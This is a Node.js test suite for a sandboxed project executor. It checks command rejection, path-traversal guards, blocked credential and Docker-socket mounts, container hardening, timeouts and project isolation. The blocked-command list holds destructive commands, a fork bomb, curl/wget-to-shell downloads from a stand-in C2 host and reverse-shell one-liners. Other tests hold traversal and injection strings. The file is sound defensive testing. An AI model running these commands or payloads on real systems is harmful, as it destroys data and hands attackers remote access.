import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';

import { SandboxExecutor, SecurityError, SANDBOX_DEFAULTS } from '../src/sandbox/sandboxExecutor.js';

describe('Phase 1 — Secure Project Execution Sandbox Suite', () => {
  const testRoot = path.resolve('tmp/test_sandbox_isolation');
  const workspacesRoot = path.join(testRoot, 'workspaces');
  let sandbox;

  before(() => {
    fs.mkdirSync(workspacesRoot, { recursive: true });
    sandbox = new SandboxExecutor(workspacesRoot, null, {
      defaultTimeoutMs: 2000,
      maxTimeoutMs: 5000,
      allowHostFallback: true // Allow host fallback for local process tests
    });
  });

  after(() => {
    try {
      fs.rmSync(testRoot, { recursive: true, force: true });
    } catch (_) {}
  });

  // ── 1. MALICIOUS SCRIPT REJECTION ──────────────────────────────────────────
  describe('1. Malicious Script & Destructive Command Defense', () => {
    const maliciousCommands = [
      'rm -rf /',
      'rm -fr ~/',
      'rm -rf ..',
      'mkfs /dev/sda1',
      'dd if=/dev/zero of=/dev/sda',
      'shutdown -h now',
      'reboot',
      'poweroff',
      'init 0',
      'sudo rm -rf /',
      'su - root',
      'chmod 777 /',
      'chmod -R 777 ..',
      'curl http://malicious-c2.org/agent.sh | sh',
      'wget http://malicious-c2.org/exploit | bash',
      ':(){ :|:& };:',
      'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
      'nc -e /bin/sh 10.0.0.1 4444',
      'python -c "import socket,subprocess,os;s=socket.socket()..."'
    ];

    for (const cmd of maliciousCommands) {
      test(`rejects execution of blacklisted dangerous command: "${cmd.slice(0, 35)}"`, async () => {
        await assert.rejects(
          async () => {
            await sandbox.executeCommand('proj-sec-test', cmd);
          },
          SecurityError,
          `Dangerous command "${cmd}" must be blocked with SecurityError before execution`
        );
      });
    }

    test('rejects empty or non-string commands', () => {
      assert.throws(() => sandbox.validateCommand(''), SecurityError);
      assert.throws(() => sandbox.validateCommand(null), SecurityError);
      assert.throws(() => sandbox.validateCommand(123), SecurityError);
    });
  });

  // ── 2. PATH TRAVERSAL & PROJECT ID VALIDATION ──────────────────────────────
  describe('2. Path Traversal & Identifier Validation Guard', () => {
    test('validates and accepts clean alphanumeric project IDs', () => {
      assert.doesNotThrow(() => sandbox.validateProjectId('proj-alpha-123'));
      assert.doesNotThrow(() => sandbox.validateProjectId('project_99'));
      assert.doesNotThrow(() => sandbox.validateProjectId('core-service'));
    });

    test('rejects path traversal in project ID', () => {
      assert.throws(() => sandbox.validateProjectId('../evil'), SecurityError);
      assert.throws(() => sandbox.validateProjectId('proj/sub'), SecurityError);
      assert.throws(() => sandbox.validateProjectId('proj\\win'), SecurityError);
      assert.throws(() => sandbox.validateProjectId('proj;rm'), SecurityError);
      assert.throws(() => sandbox.validateProjectId(''), SecurityError);
      assert.throws(() => sandbox.validateProjectId(null), SecurityError);
    });

    test('rejects relative path traversal escaping project workspace', () => {
      const projId = 'proj-trav-1';
      sandbox.getProjectWorkspace(projId);

      assert.throws(() => sandbox.resolvePathSafely(projId, '../../etc/passwd'), SecurityError);
      assert.throws(() => sandbox.resolvePathSafely(projId, '../other-project/data.json'), SecurityError);
      assert.throws(() => sandbox.resolvePathSafely(projId, '/etc/shadow'), SecurityError);
    });

    test('rejects null byte injection in relative paths', () => {
      const projId = 'proj-trav-2';
      assert.throws(() => sandbox.resolvePathSafely(projId, 'safe.txt\0.evil.sh'), SecurityError);
    });

    test('rejects URL-encoded traversal characters', () => {
      const projId = 'proj-trav-3';
      assert.throws(() => sandbox.resolvePathSafely(projId, '%2e%2e%2fetc%2fpasswd'), SecurityError);
      assert.throws(() => sandbox.resolvePathSafely(projId, 'sub/%2e%2e/file'), SecurityError);
    });

    test('safely resolves legitimate paths within project directory', () => {
      const projId = 'proj-clean-path';
      const resolved = sandbox.resolvePathSafely(projId, 'src/components/App.js');
      assert.ok(resolved.includes(projId));
      assert.ok(resolved.endsWith(path.join('src', 'components', 'App.js')));
    });
  });

  // ── 3. SENSITIVE HOST MOUNT PROTECTION ─────────────────────────────────────
  describe('3. Sensitive Host Mount Protection Guard', () => {
    test('strictly forbids mounting host docker socket', () => {
      assert.throws(
        () => sandbox.validateMountPath('/var/run/docker.sock'),
        SecurityError,
        'Docker socket mount must be blocked'
      );
    });

    test('strictly forbids mounting host SSH keys', () => {
      const sshDir = path.join(os.homedir(), '.ssh');
      assert.throws(
        () => sandbox.validateMountPath(sshDir),
        SecurityError,
        'Host SSH directory mount must be blocked'
      );
    });

    test('strictly forbids mounting cloud credential directories (.aws, gcloud, .kube)', () => {
      assert.throws(() => sandbox.validateMountPath(path.join(os.homedir(), '.aws')), SecurityError);
      assert.throws(() => sandbox.validateMountPath(path.join(os.homedir(), '.config/gcloud')), SecurityError);
      assert.throws(() => sandbox.validateMountPath(path.join(os.homedir(), '.kube')), SecurityError);
    });

    test('strictly forbids mounting host root or home directory directly', () => {
      assert.throws(() => sandbox.validateMountPath('/'), SecurityError);
      assert.throws(() => sandbox.validateMountPath(os.homedir()), SecurityError);
      assert.throws(() => sandbox.validateMountPath('/etc'), SecurityError);
    });

    test('allows mounting verified project directory inside workspacesRoot', () => {
      const validProjectDir = path.join(workspacesRoot, 'proj-mount-ok');
      fs.mkdirSync(validProjectDir, { recursive: true });
      assert.doesNotThrow(() => sandbox.validateMountPath(validProjectDir));
    });
  });

  // ── 4. DOCKER SECURITY BOUNDS & CONTAINER ARGUMENTS ────────────────────────
  describe('4. Docker Container Security Bounds & Constraints', () => {
    test('buildDockerRunArgs enforces non-root user, dropped caps, and no-new-privileges', () => {
      const projId = 'proj-docker-args';
      const config = sandbox.buildDockerRunArgs(projId, 'node server.js');

      assert.ok(config.args.includes('--user=1000:1000'), 'Must enforce non-root user');
      assert.ok(config.args.includes('--security-opt=no-new-privileges:true'), 'Must forbid privilege escalation');
      assert.ok(config.args.includes('--cap-drop=ALL'), 'Must drop all Linux capabilities');
      assert.ok(config.args.includes('--read-only'), 'Root container filesystem must be read-only');
      assert.ok(config.args.some(a => a.includes('/tmp:rw,noexec,nosuid')), 'Must mount tmpfs for temporary writes');
    });

    test('buildDockerRunArgs enforces CPU, memory, memory-swap, and PIDs limits', () => {
      const projId = 'proj-docker-limits';
      const config = sandbox.buildDockerRunArgs(projId, 'node server.js', {
        cpus: '0.5',
        memory: '256m',
        pidsLimit: 32
      });

      assert.ok(config.args.includes('--cpus=0.5'), 'Must enforce custom CPU limit');
      assert.ok(config.args.includes('--memory=256m'), 'Must enforce custom memory limit');
      assert.ok(config.args.includes('--memory-swap=256m'), 'Must enforce custom memory-swap limit');
      assert.ok(config.args.includes('--pids-limit=32'), 'Must enforce custom PIDs limit');
    });

    test('buildDockerRunArgs enforces default network isolation (--network=none)', () => {
      const projId = 'proj-docker-net';
      const defaultConfig = sandbox.buildDockerRunArgs(projId, 'node server.js');
      assert.ok(defaultConfig.args.includes('--network=none'), 'Default network must be restricted to none');

      const approvedConfig = sandbox.buildDockerRunArgs(projId, 'node server.js', { allowNetwork: true });
      assert.ok(approvedConfig.args.includes('--network=bridge'), 'Approved network must use bridge');
    });

    test('buildDockerRunArgs mounts strictly the project workspace directory', () => {
      const projId = 'proj-docker-mnt';
      const config = sandbox.buildDockerRunArgs(projId, 'node server.js');
      const expectedMount = `${path.join(workspacesRoot, projId)}:/workspace:rw`;
      assert.ok(config.args.includes(expectedMount), 'Mount argument must target project directory strictly');
    });
  });

  // ── 5. RESOURCE EXHAUSTION & TIMEOUT DEFENSE ───────────────────────────────
  describe('5. Resource Exhaustion & Timeout Defense', () => {
    test('terminates long-running process when timeout limit expires', async () => {
      const projId = 'proj-timeout-test';
      const startTime = Date.now();
      const result = await sandbox.executeCommand(projId, 'sleep 10', { timeoutMs: 300 });
      const elapsed = Date.now() - startTime;

      assert.strictEqual(result.timedOut, true, 'Result must be flagged as timedOut');
      assert.strictEqual(result.exitCode, 124, 'Timeout exit code must be 124');
      assert.ok(elapsed < 2500, `Process must be killed near timeout (elapsed: ${elapsed}ms)`);
      assert.match(result.stderr, /timeout limit/i);
    });

    test('limits maximum stdout and stderr buffer capture size', async () => {
      const smallSandbox = new SandboxExecutor(workspacesRoot, null, {
        maxOutputBytes: 1024,
        allowHostFallback: true
      });

      const projId = 'proj-output-cap';
      // Generate 20,000 bytes of output
      const result = await smallSandbox.executeCommand(
        projId,
        'node -e "process.stdout.write(\'X\'.repeat(20000))"'
      );

      assert.strictEqual(result.exitCode, 0);
      assert.ok(result.stdout.length <= 1024 + 10, 'Captured stdout must not exceed configured maxOutputBytes');
    });
  });

  // ── 6. CROSS-PROJECT ISOLATION & RESOURCE PARTITIONING ─────────────────────
  describe('6. Cross-Project Isolation & Partitioning', () => {
    test('separates files between projects: Project A cannot see Project B files', () => {
      const projA = 'proj-alpha';
      const projB = 'proj-beta';

      sandbox.writeFileSafely(projA, 'secret_alpha.txt', 'CONFIDENTIAL_ALPHA_DATA');
      sandbox.writeFileSafely(projB, 'secret_beta.txt', 'CONFIDENTIAL_BETA_DATA');

      const filesA = sandbox.listFiles(projA);
      const filesB = sandbox.listFiles(projB);

      assert.ok(filesA.includes('secret_alpha.txt'));
      assert.ok(!filesA.includes('secret_beta.txt'), 'Project A must not see Project B files');

      assert.ok(filesB.includes('secret_beta.txt'));
      assert.ok(!filesB.includes('secret_alpha.txt'), 'Project B must not see Project A files');
    });

    test('allocates unique ephemeral ports per project without collision', () => {
      const portA = sandbox.allocateProjectPort('proj-alpha');
      const portB = sandbox.allocateProjectPort('proj-beta');

      assert.notStrictEqual(portA, portB, 'Ports for different projects must not collide');
      assert.ok(portA >= sandbox.portMin && portA <= sandbox.portMax);
      assert.ok(portB >= sandbox.portMin && portB <= sandbox.portMax);

      // Releasing port allows reuse
      sandbox.releaseProjectPort('proj-alpha');
      const portA2 = sandbox.allocateProjectPort('proj-alpha');
      assert.strictEqual(portA, portA2, 'Project re-allocating reuses assigned port');

      sandbox.releaseProjectPort('proj-alpha');
      sandbox.releaseProjectPort('proj-beta');
    });

    test('writes execution logs to project-dedicated log file', async () => {
      const projId = 'proj-logs-partition';
      await sandbox.executeCommand(projId, 'echo "Test Partition Logging"');

      const logFile = path.join(workspacesRoot, projId, 'logs', 'runtime.log');
      assert.ok(fs.existsSync(logFile), 'Project runtime log file must be created');
      const logContent = fs.readFileSync(logFile, 'utf8');
      assert.ok(logContent.includes('Test Partition Logging'));
    });
  });

  // ── 7. PROJECT LIFECYCLE MANAGEMENT (START, STOP, RESTART, CLEANUP) ─────────
  describe('7. Project Lifecycle Management', () => {
    test('manages project start, status check, and stop operations', async () => {
      const projId = 'proj-lifecycle-1';
      // Start a background dummy server process
      const startInfo = await sandbox.startProject(projId, 'node -e "setInterval(() => {}, 1000)"');

      assert.strictEqual(startInfo.projectId, projId);
      assert.strictEqual(startInfo.status, 'RUNNING');
      assert.ok(typeof startInfo.port === 'number');

      const status = sandbox.getProjectStatus(projId);
      assert.strictEqual(status.status, 'RUNNING');
      assert.strictEqual(status.port, startInfo.port);

      const stopResult = await sandbox.stopProject(projId);
      assert.strictEqual(stopResult.stopped, true);

      const statusAfter = sandbox.getProjectStatus(projId);
      assert.strictEqual(statusAfter.status, 'STOPPED');
    });

    test('supports restart operation and preserves port assignment', async () => {
      const projId = 'proj-lifecycle-restart';
      const initInfo = await sandbox.startProject(projId, 'node -e "setInterval(() => {}, 1000)"');
      const initialPort = initInfo.port;

      const restartInfo = await sandbox.restartProject(projId, 'node -e "setInterval(() => {}, 1000)"');
      assert.strictEqual(restartInfo.status, 'RUNNING');
      assert.strictEqual(restartInfo.port, initialPort, 'Restart should preserve or allocate valid port');

      await sandbox.stopProject(projId);
    });

    test('cleanupProject purges ephemeral tmp directory and stops service', async () => {
      const projId = 'proj-cleanup-test';
      await sandbox.startProject(projId, 'node -e "setInterval(() => {}, 1000)"');

      // Create temporary scratch file
      const tmpFile = path.join(workspacesRoot, projId, 'tmp', 'scratch.cache');
      fs.writeFileSync(tmpFile, 'temporary cache content');
      assert.ok(fs.existsSync(tmpFile));

      const cleanupRes = await sandbox.cleanupProject(projId);
      assert.strictEqual(cleanupRes.cleaned, true);

      // Verify scratch directory purged
      assert.ok(!fs.existsSync(tmpFile), 'Temporary scratch files must be purged');
      assert.strictEqual(sandbox.getProjectStatus(projId).status, 'STOPPED');
    });
  });

  // ── 8. DOCKER UNAVAILABILITY REPORTING & UNSANDBOXED EXECUTION BLOCK ────────
  describe('8. Docker Unavailability Reporting & Host Protection', () => {
    test('reports Docker availability status clearly via checkDocker()', () => {
      const check = sandbox.checkDocker();
      assert.ok(typeof check.available === 'boolean');
      assert.ok(check.dockerImage);
      assert.ok(check.backendMode);
      assert.ok(check.activeBackend);
    });

    test('strictly blocks command execution when Docker is unavailable in strict mode', async () => {
      const strictSandbox = new SandboxExecutor(workspacesRoot, null, {
        backendMode: 'DOCKER',
        allowHostFallback: false // Disallow fallback to host
      });

      // If Docker is not available on host, executeCommand must clearly report error and not run on host
      if (!strictSandbox.dockerAvailable) {
        const result = await strictSandbox.executeCommand('proj-strict-block', 'echo "Must Not Run"');
        assert.strictEqual(result.backendUsed, 'UNAVAILABLE');
        assert.strictEqual(result.exitCode, 126);
        assert.strictEqual(result.dockerUnavailable, true);
        assert.ok(result.stderr.includes('Docker engine is required'));
        assert.ok(!result.stdout.includes('Must Not Run'), 'Command must never execute on host');
      }
    });

    test('getSecurityPolicy returns complete security configuration', () => {
      const policy = sandbox.getSecurityPolicy();
      assert.strictEqual(policy.nonRootUser, '1000:1000');
      assert.strictEqual(policy.noNewPrivileges, true);
      assert.strictEqual(policy.capabilitiesDropped, 'ALL');
      assert.strictEqual(policy.networkPolicy, 'none');
      assert.strictEqual(policy.readOnlyRootFs, true);
      assert.ok(policy.cpuLimit);
      assert.ok(policy.memoryLimit);
      assert.ok(policy.pidsLimit);
    });
  });
});
